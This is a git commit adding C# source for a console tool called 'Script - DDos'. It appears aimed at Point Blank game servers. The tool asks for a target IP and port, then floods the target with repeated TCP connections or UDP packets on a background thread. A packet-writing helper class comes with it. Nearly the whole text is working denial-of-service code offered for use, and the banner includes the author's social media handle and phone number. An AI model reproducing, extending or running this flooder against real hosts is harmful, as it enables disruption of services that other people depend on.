7399a3c8681f37a55f16c0aa2630ce1ce83ea91c
WesleyVale99 <78268026+WesleyVale99@users.noreply.github.com>
2021-01-30 12:54:02 -0300

    Adicionar arquivos de projeto.

---
+++ Script - DDos/Classes/SendPacket.cs
@@ -0,0 +1,49 @@
+﻿using System;
+using System.IO;
+using System.Text;
+
+namespace Script___DDos.Classes
+{
+    public class SendPacket
+    {
+
+        public MemoryStream stream;
+        public SendPacket()
+        {
+            stream = new MemoryStream();
+        }
+        public void WriteC(byte v) { stream.WriteByte(v); }
+        public void WriteB(byte[] v) { stream.Write(v, 0, v.Length); } //Value
+        public void WriteD(int v) { WriteB(BitConverter.GetBytes(v)); }
+        public void WriteUD(uint v) { WriteB(BitConverter.GetBytes(v)); }
+        public void WriteH(short v) { WriteB(BitConverter.GetBytes(v)); }
+        public void WriteH(ushort v) { WriteB(BitConverter.GetBytes(v)); }
+        public void WriteF(double v) { WriteB(BitConverter.GetBytes(v)); }
+        public void WriteQ(long v) { WriteB(BitConverter.GetBytes(v)); }
+        public void WriteQ(ulong v) { WriteB(BitConverter.GetBytes(v)); }
+        public void WriteS(string name, int count)
+        {
+            if (name == null)
+                name = "";
+            WriteB(Encoding.GetEncoding(1251).GetBytes(name));
+            WriteB(new byte[count - name.Length]);
+        }
+        public void Close()
+        {
+            try
+            {
+                if (stream != null)
+                {
+                    stream.Close();
+                    stream.Dispose();
+                }
+                stream = null;
+            }
+            catch (Exception e)
+            {
+                e.ToString();
+            }
+        }
+    }
+}
+
---
+++ Script - DDos/Program.cs
@@ -0,0 +1,162 @@
+﻿using Script___DDos.Classes;
+using Script___DDos.Log;
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Net;
+using System.Net.Sockets;
+using System.Threading;
+
+namespace Script___DDos
+{
+    /*
+     * @autor: Wesley
+     * Multi Conexão em Socket
+     */
+    public class Program
+    {
+        public static IPAddress Address;
+        public static string IP;
+        public static int Port;
+        public static void Main(string[] args)
+        {
+            Console.Title = "Point Blank Socket";
+            SendInitia:
+            Comp.Blue("╔════════════════════════════════════════════════════════════════════════════╗");
+            Comp.Blue("║                                                                            ║");
+            Comp.Blue("║               *</>  Developed by: (c) Wesley Vale - 2019  </>*             ║");
+            Comp.Blue("║                                                                            ║");
+            Comp.Blue("║                                                www.fb.com/wesley.vale.3192 ║");
+            Comp.Blue("║                                                wpp: 92 99188-0629          ║");
+            Comp.Blue("╚════════════════════════════════════════════════════════════════════════════╝");
+            Comp.Blue("╔══════════════════════════════╗                                  build: 0.2");
+            Comp.Blue("║        [ MENU ]              ║");
+            Comp.Blue("║  -  t  (Flodar Pacotes tcp)  ║");
+            Comp.Blue("║  -  u  (Flodar Pacotes tcp)  ║");
+            Comp.Blue("╚══════════════════════════════╝");
+            Comp.Yellow("[Console] Bem Vindo ao Point Blank SocketDump: ");
+            string inicial = Console.ReadLine().ToLower();
+            switch (inicial)
+            {
+                case "t":
+                    {
+                        if (!Sistema(inicial))
+                            return;
+                        new Thread(() =>
+                        {
+                            int index = 0;
+                            while (true)
+                            {
+                                try
+                                {
+                                    byte[] buffer = new byte[0];
+                                    Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                                    socket.Connect(new IPEndPoint(Address, Port));
+                                    if (socket.Connected)
+                                    {
+                                        socket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, (callback) =>
+                                        {
+                                            Socket id = (Socket)callback.AsyncState;
+                                            if (id.Poll(0, SelectMode.SelectRead))
+                                            {
+                                                if (id.Receive(buffer, SocketFlags.Peek) == 0)
+                                                {
+                                                    socket.Send(buffer, buffer.Length, SocketFlags.None);
+                                                    Comp.Green("[Socket TCP] Sending Packet Dump        nº[" + ++index + "]");
+                                                }
+                                            }
+                                        }, socket);
+                                    }
+                                }
+                                catch (SocketException ex)
+                                {
+                                    Comp.Red(ex.Message);
+                                    break;
+                                }
+                            }
+
+                        }).Start(); break;
+                    }
+                case "u":
+                    {
+                        if (!Sistema(inicial))
+                            return;
+                        new Thread(() =>
+                        {
+                            for (int index = 0; index <  IPEndPoint.MaxPort; index++)
+                            {
+                                try
+                                {
+                                    UdpClient udp = new UdpClient(IP, Port);
+                                    if (udp.Available == 0)
+                                    {
+                                        byte[] buff = SyncClient.Data();
+                                        udp.Send(buff, buff.Length);
+                                        Comp.Cyan("[Socket UDP] Sending Packet Dump           Buffer: [" + buff.Length + "]     nº[" + index + "]");
+                                    }
+                                }
+                                catch (SocketException ex)
+                                {
+                                    Comp.Red(ex.ToString());
+                                    break;
+                                }
+                            }
+                        }).Start();
+                        break;
+                    }
+                default:
+                    {
+                        Comp.White("[Error] Erro ao registrar a conexão especifica.");
+                        Console.Clear();
+                        goto SendInitia;
+                    }
+            }
+            Process.GetCurrentProcess().WaitForExit();
+        }
+        public static byte[] addByteToArray(byte[] bArray, byte newByte)
+        {
+            byte[] newArray = new byte[bArray.Length + 1];
+            bArray.CopyTo(newArray, 1);
+            newArray[0] = newByte;
+            return newArray;
+        }
+        public static bool Sistema(string txt)
+        {
+            if (txt.Equals("t"))
+            {
+                try
+                {
+                    Comp.Yellow("[Console] Conexão TCP, Digite o IP: ");
+                    IP = Console.ReadLine();
+                    Comp.Yellow("[Console] Conexão TCP, Digite a Porta: ");
+                    Port = int.Parse(Console.ReadLine());
+                    if (IPAddress.TryParse(IP, out Address) && Port > 0 && Port < IPEndPoint.MaxPort && IP != null)
+                        return true;
+                }
+                catch
+                {
+                    Comp.Red("Error ao registrar o IP e a Porta, Tente novamente.");
+                    return false;
+                }
+            }
+            else if (txt.Equals("u"))
+            {
+                try
+                {
+                    Comp.Yellow("[Console] Conexão UDP, Digite o IP: ");
+                    IP = Console.ReadLine();
+                    Comp.Yellow("[Console] Conexão UDP, Digite a Porta: ");
+                    Port = int.Parse(Console.ReadLine());
+                    if (IPAddress.TryParse(IP, out Address) && Port > 0 && Port < IPEndPoint.MaxPort && IP != null)
+                        return true;
+                }
+                catch
+                {
+                    Comp.Red("Error ao registrar o IP e a Porta, Tente novamente.");
+                    return false;
+                }
+            }
+            return false;
+        }
+    }
+}
